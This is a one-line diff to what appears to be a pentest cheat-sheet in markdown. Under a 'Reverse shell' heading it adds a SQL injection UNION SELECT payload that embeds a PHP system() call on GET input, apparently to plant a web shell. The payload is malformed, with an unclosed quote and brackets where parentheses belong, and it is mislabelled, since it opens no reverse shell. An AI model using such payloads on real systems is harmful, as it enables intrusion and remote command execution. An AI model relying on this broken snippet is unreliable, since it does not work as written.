@@ -32,7 +32,7 @@
 
 ### Reverse shell
 
-- 
+- union select 1, 2, '<?php system[$_GET]>
 
 
 ### TIPS
